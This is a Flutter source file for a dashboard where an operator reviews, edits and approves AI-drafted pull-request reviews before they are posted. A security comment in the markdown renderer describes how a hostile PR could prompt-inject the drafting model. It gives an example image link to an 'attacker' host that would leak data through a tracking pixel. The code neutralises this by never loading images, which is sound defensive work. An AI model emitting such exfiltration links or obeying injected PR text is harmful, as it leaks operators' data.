import 'package:fixnum/fixnum.dart';
import 'package:flutter/material.dart';
import 'package:flutter_markdown/flutter_markdown.dart';

import '../clients.dart';
import '../gen/agent/v1/review_fleet.pb.dart';

/// The **Fleet** tab: view, trigger, and act on the review-fleet's PR review
/// drafts (review-fleet C14), plus light roster control. Talks to the full
/// `--serve-fleet` process (`:50086`) — the only one that wires the orchestrator
/// (`ReviewNow`), the approver (`Approve`), and the persisted history the review
/// RPCs read (`ListReviews`/`GetReview`).
///
/// Two panes: a left master list of review drafts (filterable by repo/status),
/// with a collapsible **Sessions** strip above it (enable/disable + "Review
/// now"); and a right detail pane that renders the selected draft's markdown
/// body and offers **Approve & post** (the only outward-facing action, gated
/// behind a confirm dialog). Editing the body is increment 4.
class FleetPage extends StatefulWidget {
  final PortalClients clients;
  const FleetPage({super.key, required this.clients});

  @override
  State<FleetPage> createState() => _FleetPageState();
}

/// The draft-status filter. `any` maps to an empty wire filter.
enum _StatusFilter { any, drafted, approved, posted, superseded }

class _FleetPageState extends State<FleetPage> {
  final _repo = TextEditingController();
  _StatusFilter _status = _StatusFilter.any;

  List<ReviewSummary> _reviews = [];
  List<FleetSession> _sessions = [];
  ReviewSummary? _selected;
  bool _loading = true;
  String? _error;
  bool _showSessions = false;

  @override
  void initState() {
    super.initState();
    _reload();
  }

  @override
  void dispose() {
    _repo.dispose();
    super.dispose();
  }

  Future<void> _reload() async {
    setState(() {
      _loading = true;
      _error = null;
    });
    try {
      final req = ListReviewsRequest()
        ..repo = _repo.text.trim()
        ..status = _status == _StatusFilter.any ? '' : _status.name
        ..limit = 0; // 0 ⇒ the server's row cap
      // Roster + drafts in parallel; roster is best-effort (the strip is
      // secondary), so a roster failure doesn't blank the drafts list.
      final reviewsF = widget.clients.fleet.listReviews(req);
      final sessionsF = widget.clients.fleet
          .list(FleetListRequest())
          .then((r) => r.sessions.toList())
          .catchError((_) => <FleetSession>[]);
      final reviews = (await reviewsF).reviews.toList();
      final sessions = await sessionsF;
      if (!mounted) return;
      setState(() {
        _reviews = reviews;
        _sessions = sessions;
        // Re-select by id so an action keeps the detail pane in place.
        final selId = _selected?.reviewId;
        _selected = selId == null
            ? null
            : _reviews.where((r) => r.reviewId == selId).firstOrNull;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _error = '$e';
        _loading = false;
      });
    }
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  Future<void> _toggleEnable(FleetSession s, bool enabled) async {
    try {
      await widget.clients.fleet.setEnabled(
        FleetSetEnabledRequest()
          ..id = s.id
          ..enabled = enabled,
      );
      _snack('${s.id} ${enabled ? "enabled" : "disabled"}.');
      await _reload();
    } catch (e) {
      _snack('Enable failed: $e');
    }
  }

  Future<void> _reviewNow(FleetSession s) async {
    final controller = TextEditingController();
    final prText = await showDialog<String>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Review now — ${s.id}'),
        content: TextField(
          controller: controller,
          autofocus: true,
          keyboardType: TextInputType.number,
          decoration: const InputDecoration(
            labelText: 'PR number',
            helperText: 'Queue a review of this PR now',
            border: OutlineInputBorder(),
          ),
          onSubmitted: (v) => Navigator.pop(ctx, v),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text('Cancel'),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(ctx, controller.text),
            child: const Text('Queue'),
          ),
        ],
      ),
    );
    controller.dispose();
    final pr = int.tryParse((prText ?? '').trim());
    if (pr == null || pr <= 0) return;
    try {
      final reply = await widget.clients.fleet.reviewNow(
        ReviewNowRequest()
          ..sessionId = s.id
          ..prNumber = Int64(pr),
      );
      _snack(reply.accepted
          ? 'Queued review of PR #$pr on ${s.id}.'
          : 'PR #$pr already pending/in-flight — coalesced.');
      await _reload();
    } catch (e) {
      _snack('Review now failed: $e');
    }
  }

  Future<void> _approve(ReviewSummary r) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text('Approve & post review of PR #${r.prNumber}?'),
        content: const Text(
          'This posts the review to the forge. This is outward-facing and '
          'cannot be taken back.',
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Cancel'),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Approve & post'),
          ),
        ],
      ),
    );
    if (ok != true) return;
    try {
      final reply = await widget.clients.fleet.approve(
        ApproveRequest()..reviewId = r.reviewId,
      );
      switch (reply.status) {
        case 'posted':
          _snack('Posted${reply.detail.isEmpty ? "" : ": ${reply.detail}"}');
        case 'already_posted':
          _snack('Already posted.');
        case 'not_found':
          _snack('Draft not found (superseded?).');
        default:
          _snack('Approve: ${reply.status}');
      }
      await _reload();
    } catch (e) {
      _snack('Approve failed: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        // Filter bar.
        Material(
          color: theme.colorScheme.surfaceContainerHighest,
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            child: Row(
              children: [
                const Icon(Icons.rate_review_outlined, size: 18),
                const SizedBox(width: 8),
                const Text('Review drafts',
                    style: TextStyle(fontWeight: FontWeight.bold)),
                const SizedBox(width: 16),
                SizedBox(
                  width: 220,
                  child: TextField(
                    controller: _repo,
                    decoration: const InputDecoration(
                      isDense: true,
                      labelText: 'repo (owner__name)',
                      border: OutlineInputBorder(),
                    ),
                    onSubmitted: (_) => _reload(),
                  ),
                ),
                const SizedBox(width: 12),
                DropdownButton<_StatusFilter>(
                  value: _status,
                  items: _StatusFilter.values
                      .map((s) => DropdownMenuItem(
                            value: s,
                            child: Text(s.name),
                          ))
                      .toList(),
                  onChanged: (v) {
                    if (v == null) return;
                    setState(() => _status = v);
                    _reload();
                  },
                ),
                const Spacer(),
                OutlinedButton.icon(
                  onPressed: _reload,
                  icon: const Icon(Icons.refresh, size: 18),
                  label: const Text('Refresh'),
                ),
              ],
            ),
          ),
        ),
        const Divider(height: 1),
        Expanded(child: _body()),
      ],
    );
  }

  Widget _body() {
    if (_loading) return const Center(child: CircularProgressIndicator());
    if (_error != null) {
      return _OfflineRetry(message: _error!, onRetry: _reload);
    }
    return Row(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        SizedBox(width: 360, child: _leftColumn()),
        const VerticalDivider(width: 1),
        Expanded(
          child: _selected == null
              ? const Center(child: Text('Select a review draft'))
              : _DraftDetail(
                  key: ValueKey(_selected!.reviewId),
                  clients: widget.clients,
                  summary: _selected!,
                  onApprove: () => _approve(_selected!),
                ),
        ),
      ],
    );
  }

  Widget _leftColumn() {
    return Column(
      children: [
        _sessionsStrip(),
        const Divider(height: 1),
        Expanded(
          child: _reviews.isEmpty
              ? const Center(
                  child: Padding(
                    padding: EdgeInsets.all(16),
                    child: Text('No review drafts match.',
                        textAlign: TextAlign.center),
                  ),
                )
              : ListView.builder(
                  itemCount: _reviews.length,
                  itemBuilder: (ctx, i) {
                    final r = _reviews[i];
                    return ListTile(
                      selected: _selected?.reviewId == r.reviewId,
                      dense: true,
                      title: Text('PR #${r.prNumber} · ${r.repo}',
                          maxLines: 1, overflow: TextOverflow.ellipsis),
                      subtitle: Text(
                        'risk ${r.riskScore.toStringAsFixed(2)}'
                        '${r.gateFailed ? " · gate failed" : ""}'
                        ' · ${r.nFindings} findings',
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                      leading: _statusChip(r.status),
                      onTap: () => setState(() => _selected = r),
                    );
                  },
                ),
        ),
      ],
    );
  }

  Widget _sessionsStrip() {
    return ExpansionTile(
      initiallyExpanded: _showSessions,
      onExpansionChanged: (v) => setState(() => _showSessions = v),
      leading: const Icon(Icons.dns_outlined),
      title: Text('Sessions (${_sessions.length})',
          style: const TextStyle(fontWeight: FontWeight.bold)),
      childrenPadding: EdgeInsets.zero,
      children: _sessions.isEmpty
          ? [
              const ListTile(
                dense: true,
                title: Text('No roster sessions.'),
              )
            ]
          : _sessions
              .map((s) => ListTile(
                    dense: true,
                    title: Text(s.id,
                        maxLines: 1, overflow: TextOverflow.ellipsis),
                    subtitle: Text(s.repo,
                        maxLines: 1, overflow: TextOverflow.ellipsis),
                    trailing: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        IconButton(
                          icon: const Icon(Icons.play_circle_outline),
                          tooltip: 'Review now',
                          onPressed: () => _reviewNow(s),
                        ),
                        Switch(
                          value: s.enabled,
                          onChanged: (v) => _toggleEnable(s, v),
                        ),
                      ],
                    ),
                  ))
              .toList(),
    );
  }

  Widget _statusChip(String status) {
    final color = switch (status) {
      'posted' => Colors.green,
      'approved' => Colors.blue,
      'superseded' => Colors.grey,
      _ => Colors.orange, // drafted
    };
    return Tooltip(
      message: status,
      child: Icon(Icons.circle, size: 12, color: color),
    );
  }
}

/// The detail pane's mode: the rendered read view, a raw-markdown editor, or a
/// live preview of the edit buffer (GitHub-style edit/preview).
enum _DetailMode { view, edit, preview }

/// The right detail pane: fetches the selected draft's body (GetReview) and
/// renders it as markdown, with an Edit/Preview toggle (Save → UpdateReview) and
/// an Approve & post action. Keyed by review_id so selecting a different draft
/// rebuilds it fresh. A `posted`/`approved` draft is locked — editing is
/// disabled and the server would reject a write anyway (UpdateReview → locked).
class _DraftDetail extends StatefulWidget {
  final PortalClients clients;
  final ReviewSummary summary;
  final VoidCallback onApprove;
  const _DraftDetail({
    super.key,
    required this.clients,
    required this.summary,
    required this.onApprove,
  });

  @override
  State<_DraftDetail> createState() => _DraftDetailState();
}

class _DraftDetailState extends State<_DraftDetail> {
  final _edit = TextEditingController();
  String? _body;
  bool _truncated = false;
  bool _loading = true;
  bool _saving = false;
  String? _error;
  // The draft is listed but has no readable body on this fleet instance — the
  // server answered NotFound (e.g. it belongs to a different fleet root). A clean
  // empty state, not a connectivity error.
  bool _unavailable = false;
  _DetailMode _mode = _DetailMode.view;

  /// A `posted`/`approved` draft can't be edited (matches the server's write
  /// gate — UpdateReview returns `locked`).
  bool get _locked =>
      widget.summary.status == 'posted' || widget.summary.status == 'approved';

  /// The edit buffer differs from the persisted body.
  bool get _dirty => _edit.text != (_body ?? '');

  @override
  void initState() {
    super.initState();
    _fetch();
  }

  @override
  void dispose() {
    _edit.dispose();
    super.dispose();
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  Future<void> _fetch() async {
    setState(() {
      _loading = true;
      _error = null;
      _unavailable = false;
    });
    try {
      final reply = await widget.clients.fleet.getReview(
        GetReviewRequest()..reviewId = widget.summary.reviewId,
      );
      if (!mounted) return;
      setState(() {
        _body = reply.body;
        _edit.text = reply.body; // keep the edit buffer in sync with disk
        _truncated = reply.truncated;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      // A draft with no readable body here (e.g. one minted under a different
      // fleet root, still listed by ListReviews) comes back as gRPC NotFound —
      // show the empty state, not the offline/retry panel.
      if (_grpcCode(e) == _grpcNotFound) {
        setState(() {
          _unavailable = true;
          _loading = false;
        });
        return;
      }
      setState(() {
        _error = '$e';
        _loading = false;
      });
    }
  }

  Future<void> _save() async {
    setState(() => _saving = true);
    try {
      final reply = await widget.clients.fleet.updateReview(
        UpdateReviewRequest()
          ..reviewId = widget.summary.reviewId
          ..body = _edit.text,
      );
      switch (reply.status) {
        case 'updated':
          _snack('Saved.');
          if (!mounted) return;
          setState(() => _mode = _DetailMode.view);
          await _fetch();
        case 'locked':
          _snack('Locked — this draft is posted/approved and can\'t be edited.');
          await _fetch();
        case 'not_found':
          _snack('Draft not found (superseded?).');
        default:
          _snack('Save: ${reply.status}');
      }
    } catch (e) {
      _snack('Save failed: $e');
    } finally {
      if (mounted) setState(() => _saving = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final r = widget.summary;
    final posted = r.status == 'posted';
    // Approving posts the *persisted* body, so block it while there are unsaved
    // edits — the operator should Save first (edit → save → approve). Also block
    // when there's no readable body here (an unavailable/cross-root draft).
    final canApprove = !posted && !_dirty && !_saving && !_unavailable;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
          child: Row(
            children: [
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('PR #${r.prNumber} · ${r.repo}',
                        style: Theme.of(context).textTheme.titleLarge),
                    Text(
                      '${r.status} · risk ${r.riskScore.toStringAsFixed(2)}'
                      '${r.gateFailed ? " · gate failed" : ""}'
                      ' · +${r.additions}/-${r.deletions} in ${r.filesChanged} files',
                      style: Theme.of(context).textTheme.bodySmall,
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 12),
              FilledButton.icon(
                onPressed: canApprove ? widget.onApprove : null,
                icon: const Icon(Icons.send, size: 18),
                label: Text(posted ? 'Posted' : 'Approve & post'),
              ),
            ],
          ),
        ),
        // Mode toggle + Save. A locked draft has no editor — view only. Hidden
        // when there's no readable body here (an unavailable/cross-root draft).
        if (!_loading && _error == null && !_unavailable)
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 8),
            child: Row(
              children: [
                SegmentedButton<_DetailMode>(
                  segments: [
                    const ButtonSegment(
                      value: _DetailMode.view,
                      icon: Icon(Icons.visibility_outlined, size: 18),
                      label: Text('View'),
                    ),
                    ButtonSegment(
                      value: _DetailMode.edit,
                      icon: const Icon(Icons.edit_outlined, size: 18),
                      label: const Text('Edit'),
                      enabled: !_locked,
                    ),
                    ButtonSegment(
                      value: _DetailMode.preview,
                      icon: const Icon(Icons.article_outlined, size: 18),
                      label: const Text('Preview'),
                      enabled: !_locked,
                    ),
                  ],
                  selected: {_mode},
                  onSelectionChanged: (s) => setState(() => _mode = s.first),
                ),
                const Spacer(),
                if (_locked)
                  Text('read-only (${r.status})',
                      style: Theme.of(context).textTheme.bodySmall),
                if (!_locked && _mode != _DetailMode.view) ...[
                  if (_dirty)
                    Padding(
                      padding: const EdgeInsets.only(right: 8),
                      child: Text('unsaved',
                          style: TextStyle(
                              color: Theme.of(context).colorScheme.error)),
                    ),
                  FilledButton.tonalIcon(
                    onPressed: (_dirty && !_saving) ? _save : null,
                    icon: _saving
                        ? const SizedBox(
                            width: 16,
                            height: 16,
                            child: CircularProgressIndicator(strokeWidth: 2))
                        : const Icon(Icons.save, size: 18),
                    label: const Text('Save'),
                  ),
                ],
              ],
            ),
          ),
        if (_truncated)
          Container(
            width: double.infinity,
            color: Theme.of(context).colorScheme.errorContainer,
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
            child: Text(
                'Body truncated at the server cap — saving would overwrite the '
                'full draft with this shortened copy. Do not save.',
                style: TextStyle(
                    color: Theme.of(context).colorScheme.onErrorContainer)),
          ),
        const Divider(height: 1),
        Expanded(child: _content()),
      ],
    );
  }

  Widget _content() {
    if (_loading) return const Center(child: CircularProgressIndicator());
    if (_error != null) {
      return _OfflineRetry(message: _error!, onRetry: _fetch);
    }
    if (_unavailable) {
      return const Center(
        child: Padding(
          padding: EdgeInsets.all(24),
          child: Text(
            'No stored body for this draft on this fleet instance.\n'
            'It may belong to a different fleet root (an earlier run).',
            textAlign: TextAlign.center,
          ),
        ),
      );
    }
    switch (_mode) {
      case _DetailMode.edit:
        return Padding(
          padding: const EdgeInsets.all(16),
          child: TextField(
            controller: _edit,
            maxLines: null,
            expands: true,
            textAlignVertical: TextAlignVertical.top,
            keyboardType: TextInputType.multiline,
            style: const TextStyle(fontFamily: 'monospace', fontSize: 13),
            decoration: const InputDecoration(
              border: OutlineInputBorder(),
              alignLabelWithHint: true,
              hintText: 'Draft markdown…',
            ),
            // Refresh the dirty/Save state as the operator types.
            onChanged: (_) => setState(() {}),
          ),
        );
      case _DetailMode.preview:
        return _markdown(_edit.text);
      case _DetailMode.view:
        return _markdown(_body ?? '');
    }
  }

  Widget _markdown(String body) {
    if (body.isEmpty) {
      return const Center(child: Text('Empty draft body.'));
    }
    // Security: the draft body is model-authored from an untrusted PR (CLAUDE.md
    // — the LLM is prompt-injectable). Never auto-fetch an embedded image: a
    // hostile PR could induce `![x](http://attacker/track.png?leak=…)` in the
    // draft, and rendering it would fire a request from the operator's browser
    // (a tracking pixel / SSRF). Replace every image with an inert placeholder;
    // no network request is ever made, whatever the scheme. Links are already
    // inert (we pass no `onTapLink`, so a tap does nothing).
    return Markdown(
      data: body,
      selectable: true,
      sizedImageBuilder: _inertImage,
    );
  }

  /// A non-fetching stand-in for a markdown image — shows the alt text (or the
  /// raw URI) without loading anything. See the security note at the call site.
  Widget _inertImage(MarkdownImageConfig config) {
    final label = (config.alt != null && config.alt!.isNotEmpty)
        ? config.alt!
        : config.uri.toString();
    return Tooltip(
      message: config.uri.toString(),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          const Icon(Icons.image_not_supported_outlined, size: 16),
          const SizedBox(width: 4),
          Flexible(
            child: Text('[image not loaded: $label]',
                style: const TextStyle(fontStyle: FontStyle.italic)),
          ),
        ],
      ),
    );
  }
}

/// gRPC `NotFound` status code. `package:grpc/service_api.dart` (all the portal
/// imports) doesn't export `StatusCode`, so we compare the numeric code.
const int _grpcNotFound = 5;

/// The gRPC status code carried by an error, or null if it isn't a `GrpcError`.
/// `GrpcError` isn't exported by `service_api.dart` either, so read `.code`
/// dynamically rather than catching the type.
int? _grpcCode(Object e) {
  try {
    final code = (e as dynamic).code;
    return code is int ? code : null;
  } catch (_) {
    return null;
  }
}

/// Whole-view offline state with a retry, mirroring the other pages' pattern.
class _OfflineRetry extends StatelessWidget {
  final String message;
  final VoidCallback onRetry;
  const _OfflineRetry({required this.message, required this.onRetry});

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          const Icon(Icons.cloud_off, size: 48),
          const SizedBox(height: 12),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 32),
            child: Text('Not connected to the fleet (:50086).\n$message',
                textAlign: TextAlign.center),
          ),
          const SizedBox(height: 12),
          FilledButton(onPressed: onRetry, child: const Text('Retry')),
        ],
      ),
    );
  }
}

extension _FirstOrNull<E> on Iterable<E> {
  E? get firstOrNull {
    final it = iterator;
    return it.moveNext() ? it.current : null;
  }
}
